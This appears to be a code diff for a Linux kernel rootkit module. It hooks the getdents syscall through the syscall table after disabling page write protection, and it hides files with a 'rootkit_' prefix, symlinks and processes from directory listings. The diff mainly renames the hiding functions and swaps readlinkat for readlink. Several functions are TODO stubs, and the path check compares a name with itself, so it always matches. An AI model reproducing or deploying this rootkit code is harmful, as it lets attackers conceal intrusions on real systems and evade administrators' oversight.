@@ -10,7 +10,7 @@
 
 /* pointers to some important kernel functions/resources */
 asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage ssize_t (*syscall_readlinkat) (int dirfd, const char *path, char *buf, size_t bufsiz);
+asmlinkage ssize_t (*syscall_readlink) (const char *path, char *buf, size_t bufsiz);
 
 /*
  * call counter to ensure that we are not unhooking the
@@ -28,7 +28,7 @@ static unsigned long getdents_lock_flags;
  * file to check.
  */
 int
-hide_fpath(int fd, char *d_name)
+check_hide_fpath(char *d_name)
 {
 	// TODO: loop the list of paths to hide
 	if(strcmp(d_name, d_name) == 0)
@@ -44,7 +44,7 @@ hide_fpath(int fd, char *d_name)
  * of its prefix
  */
 int
-hide_fprefix(char *d_name)
+check_hide_fprefix(char *d_name)
 {
 	// TODO: implement dynamic prefixes
 	if(strstr(d_name, "rootkit_") == d_name) 
@@ -64,7 +64,7 @@ hide_fprefix(char *d_name)
  * id of a hidden process. fd must match the /proc/ folder.
  */
 int
-hide_process(int fd, char *d_name)
+check_hide_process(int fd, char *d_name)
 {	
 	// TODO
 	
@@ -72,7 +72,7 @@ hide_process(int fd, char *d_name)
 }
 
 int
-hide_symlink(int fd, char *d_name)
+check_hide_symlink(char *d_name)
 {
 	mm_segment_t old_fs;
 	char lpath[128];
@@ -86,7 +86,7 @@ hide_symlink(int fd, char *d_name)
 		set_fs(KERNEL_DS);
 	
 		/* execute our readlinkat syscall */
-		lpath_len = (*syscall_readlinkat) (fd, d_name, lpath, 128);
+		lpath_len = (*syscall_readlink) (d_name, lpath, 128);
 	
 		/* reset the kernel */	
 		set_fs(old_fs);
@@ -149,10 +149,10 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 //			ret -= len;
 //		}	
 		/* Check if we need to hide this file */
-		if(hide_fpath(fd, dirp->d_name)
-				|| hide_fprefix(dirp->d_name)
-				|| hide_process(fd, dirp->d_name)
-				|| hide_symlink(fd, dirp->d_name))
+		if(check_hide_fpath(dirp->d_name)
+				|| check_hide_fprefix(dirp->d_name)
+				|| check_hide_process(fd, dirp->d_name)
+				|| check_hide_symlink(dirp->d_name))
 		{	
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
@@ -180,8 +180,8 @@ hook_getdents(void) {
 	/* initialize our spinlock for the getdents counter */
 	spin_lock_init(getdents_lock);
 
-	/* get the 'readlinkat' syscall */
-	syscall_readlinkat = (void*) sys_call_table[__NR_readlinkat];
+	/* get the 'readlink' syscall */
+	syscall_readlink = (void*) sys_call_table[__NR_readlink];
 
 	/* disable write protection */
 	disable_page_protection();
